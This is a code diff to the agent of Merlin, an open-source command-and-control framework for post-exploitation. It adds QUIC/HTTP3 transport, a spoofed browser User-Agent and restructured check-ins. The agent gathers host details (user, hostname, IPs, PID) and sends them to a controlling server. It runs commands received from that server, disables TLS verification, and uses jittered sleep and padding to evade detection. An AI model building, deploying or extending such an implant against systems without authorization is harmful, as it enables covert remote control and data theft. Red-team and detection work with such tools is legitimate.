@@ -41,6 +41,8 @@ import (
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
+	"github.com/lucas-clemente/quic-go"
+	"github.com/lucas-clemente/quic-go/h2quic"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg"
@@ -49,39 +51,39 @@ import (
 )
 
 // GLOBAL VARIABLES
-var mRun = true
-var h2Client = getH2WebClient()
-var agentShell = ""
-var build = "nonRelease"
-var initial = false
+var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time
 
 //TODO this is a duplicate with agents/agents.go, centralize
 
 // Agent is a structure for agent objects. It is not exported to force the use of the New() function
 type Agent struct {
-	ID            uuid.UUID
-	Platform      string
-	Architecture  string
-	UserName      string
-	UserGUID      string
-	HostName      string
-	Ips           []string
-	Pid           int
-	iCheckIn      time.Time
-	sCheckIn      time.Time
-	Version       string
-	Build         string
-	WaitTime      time.Duration
-	PaddingMax    int
-	MaxRetry      int
-	FailedCheckin int
-	Skew		  int64
-	Verbose		  bool
-	Debug 		  bool
+	ID            uuid.UUID // ID is a Universally Unique Identifier per agent
+	Platform      string // Platform is the operating system platform the agent is running on (i.e. windows)
+	Architecture  string // Architecture is the operating system architecture the agent is running on (i.e. amd64)
+	UserName      string // UserName is the username that the agent is running as
+	UserGUID      string // UserGUID is a Globally Unique Identifier associated with username
+	HostName      string // HostName is the computer's host name
+	Ips           []string // Ips is a slice of all the IP addresses assigned to the host's interfaces
+	Pid           int // Pid is the Process ID that the agent is running under
+	iCheckIn      time.Time // iCheckIn is a timestamp of the agent's initial check in time
+	sCheckIn      time.Time // sCheckIn is a timestamp of the agent's last status check in time
+	Version       string // Version is the version number of the Merlin Agent program
+	Build         string // Build is the build number of the Merlin Agent program
+	WaitTime      time.Duration // WaitTime is how much time the agent waits in-between checking in
+	PaddingMax    int // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	MaxRetry      int // MaxRetry is the maximum amount of failed check in attempts before the agent quits
+	FailedCheckin int // FailedCheckin is a count of the total number of failed check ins
+	Skew		  int64 // Skew is size of skew added to each WaitTime to vary check in attempts
+	Verbose		  bool // Verbose enables verbose messages to standard out
+	Debug 		  bool // Debug enables debug messages to standard out
+	Proto 		  string // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
+	Client 		  *http.Client // Client is an http.Client object used to make HTTP connections for agent communications
+	UserAgent	  string // UserAgent is the user agent string used with HTTP connections
+	initial		  bool // initial identifies if the agent has successfully completed the first initial check in
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(verbose bool, debug bool) Agent {
+func New(protocol string, verbose bool, debug bool) Agent {
 	if debug{message("debug", "Entering agent.init() function")}
 	a := Agent {
 		ID: uuid.NewV4(),
@@ -95,6 +97,9 @@ func New(verbose bool, debug bool) Agent {
 		Skew: 3000,
 		Verbose: verbose,
 		Debug: debug,
+		Proto: protocol,
+		UserAgent: "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
+		initial: false,
 	}
 
 	u, errU := user.Current()
@@ -135,6 +140,15 @@ func New(verbose bool, debug bool) Agent {
 		}
 	}
 
+	client, errClient := getClient(a.Proto)
+	if errClient == nil {
+		a.Client = client
+	} else {
+		if a.Verbose {
+			message("warn", errClient.Error())
+		}
+	}
+
 	if a.Verbose {
 		message("info","Host Information:")
 		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
@@ -146,12 +160,12 @@ func New(verbose bool, debug bool) Agent {
 		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
 		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
 	}
-	if debug{message("debug", "Leaving agent.init() function")}
+	if debug{message("debug", "Leaving agent.New() function")}
 	return a
 }
 
 // Run instructs an agent to establish communications with the passed in server using the passed in protocol
-func (a *Agent) Run(server string, proto string) {
+func (a *Agent) Run(server string) {
 	rand.Seed(time.Now().UTC().UnixNano())
 
 	if a.Verbose {
@@ -159,17 +173,14 @@ func (a *Agent) Run(server string, proto string) {
 		message("note", fmt.Sprintf("Agent build: %s", build))
 	}
 
-	for mRun {
-		if initial {
+	for {
+		if a.initial {
 			if a.Verbose {
 				message("note","Checking in")
 			}
-			a.statusCheckIn(server, h2Client)
+			go a.statusCheckIn(server, a.Client)
 		} else {
-			initial = a.initialCheckIn(server, h2Client)
-			if initial {
-				a.agentInfo(server, h2Client)
-			}
+			a.initial = a.initialCheckIn(server, a.Client)
 		}
 		if a.FailedCheckin >= a.MaxRetry {
 			if a.Debug{message("debug", "Failed Checkin is greater than or equal to max retries. Quitting")}
@@ -188,10 +199,10 @@ func (a *Agent) Run(server string, proto string) {
 
 func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 
-	if a.Debug {message("debug","Entering initialCheckIn fuction")}
+	if a.Debug {message("debug","Entering initialCheckIn function")}
 
 	// JSON "initial" payload object
-	i := messages.SysInfo{
+	s := messages.SysInfo{
 		Platform:     a.Platform,
 		Architecture: a.Architecture,
 		UserName:     a.UserName,
@@ -201,7 +212,7 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 		Ips:          a.Ips,
 	}
 
-	payload, errP := json.Marshal(i)
+	sysInfoPayload, errP := json.Marshal(s)
 
 	if errP != nil {
 		if a.Debug {
@@ -210,12 +221,33 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 		}
 	}
 
+	i := messages.AgentInfo{
+		Version:       merlin.Version,
+		Build:         build,
+		WaitTime:      a.WaitTime.String(),
+		PaddingMax:    a.PaddingMax,
+		MaxRetry:      a.MaxRetry,
+		FailedCheckin: a.FailedCheckin,
+		Skew:		   a.Skew,
+		Proto:		   a.Proto,
+		SysInfo:	   (*json.RawMessage)(&sysInfoPayload),
+	}
+
+	agentInfoPayload, errA := json.Marshal(i)
+
+	if errA != nil {
+		if a.Debug {
+			message("warn", "There was an error marshaling the JSON object")
+			message("warn", fmt.Sprintf("%s", errA.Error()))
+		}
+	}
+
 	// JSON message to be sent to the server
 	g := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
 		Type:    "InitialCheckIn", // TODO Can set this to a constant in messages.go
-		Payload: (*json.RawMessage)(&payload),
+		Payload: (*json.RawMessage)(&agentInfoPayload),
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
@@ -224,7 +256,15 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 	if a.Verbose {
 		message("note",fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
 	}
-	resp, err := client.Post(host, "application/json; charset=utf-8", b)
+	req, reqErr := http.NewRequest("POST", host, b)
+	if reqErr != nil {
+		if a.Verbose{
+			message("warn", reqErr.Error())
+		}
+	}
+	req.Header.Set("User-Agent", a.UserAgent)
+	req.Header.Set("Content-Type", "application/json; charset=utf-8")
+	resp, err := client.Do(req)
 
 	if err != nil {
 		a.FailedCheckin++
@@ -274,7 +314,15 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 		message("note",fmt.Sprintf("Connecting to web server at %s for status check in.", host))
 	}
 
-	resp, err := client.Post(host, "application/json; charset=utf-8", b)
+	req, reqErr := http.NewRequest("POST", host, b)
+	if reqErr != nil {
+		if a.Verbose{
+			message("warn", reqErr.Error())
+		}
+	}
+	req.Header.Set("User-Agent", a.UserAgent)
+	req.Header.Set("Content-Type", "application/json; charset=utf-8")
+	resp, err := client.Do(req)
 
 	if err != nil {
 		if a.Debug {
@@ -377,7 +425,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 							if a.Verbose {
 								message("success",fmt.Sprintf("Successfully download file to %s", p.FileLocation))
 							}
-							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent", p.FileLocation)
+							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
 						}
 					}
 				}
@@ -497,7 +545,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				os.Exit(0)
 			case "sleep":
 				if a.Verbose {
-					message("note", fmt.Sprintf("Setting agent sleep time to %s milliseconds", p.Args))
+					message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
 				}
 				t, err := time.ParseDuration(p.Args)
 				if err != nil {
@@ -545,7 +593,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				if a.Verbose {
 					message("note", "Received agent re-initialize message")
 				}
-				initial = false
+				a.initial = false
 			case "maxretry":
 
 				t, err := strconv.Atoi(p.Args)
@@ -573,28 +621,33 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 	}
 }
 
-func getH2WebClient() *http.Client {
+// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
+func getClient(protocol string) (*http.Client, error) {
 
-	// Setup TLS Configuration
-	tr := &http2.Transport{
-		TLSClientConfig: &tls.Config{
-			MinVersion:               tls.VersionTLS12,
-			InsecureSkipVerify:       true,
-			PreferServerCipherSuites: false,
-			CipherSuites: []uint16{
-				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-			},
-			NextProtos: []string{"h2"},
+	// Setup TLS configuration
+	TLSConfig := &tls.Config{
+		MinVersion: tls.VersionTLS12,
+		InsecureSkipVerify: true,
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
 		},
-		DisableCompression: false,
+		NextProtos: []string{protocol},
 	}
 
-	// Setup HTTP Client Configuration
-	client := &http.Client{
-		Transport: tr,
+	if protocol == "hq" {
+		transport := &h2quic.RoundTripper{
+			QuicConfig: &quic.Config{IdleTimeout: 168 * time.Hour},
+			TLSClientConfig: TLSConfig,
+		}
+		return &http.Client{Transport: transport}, nil
+	} else if protocol == "h2" {
+		transport := &http2.Transport{
+			TLSClientConfig: TLSConfig,
+		}
+		return &http.Client{Transport: transport}, nil
 	}
-	return client
+	return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 }
 
 func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
@@ -602,7 +655,7 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
 
 	} else if a.Verbose {
-		message("success", fmt.Sprintf("Executing command %s %s %s", agentShell, j.Command, j.Args))
+		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
 	}
 
 	stdout, stderr = ExecuteCommand(j.Command, j.Args)
@@ -630,6 +683,7 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 		MaxRetry:      a.MaxRetry,
 		FailedCheckin: a.FailedCheckin,
 		Skew:		   a.Skew,
+		Proto:		   a.Proto,
 	}
 
 	payload, errP := json.Marshal(i)
@@ -720,3 +774,4 @@ func message (level string, message string) {
 // TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
 // TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
 // TODO send cmdResult for agentcontrol messages
+// TODO configure set UserAgent agentcontrol message
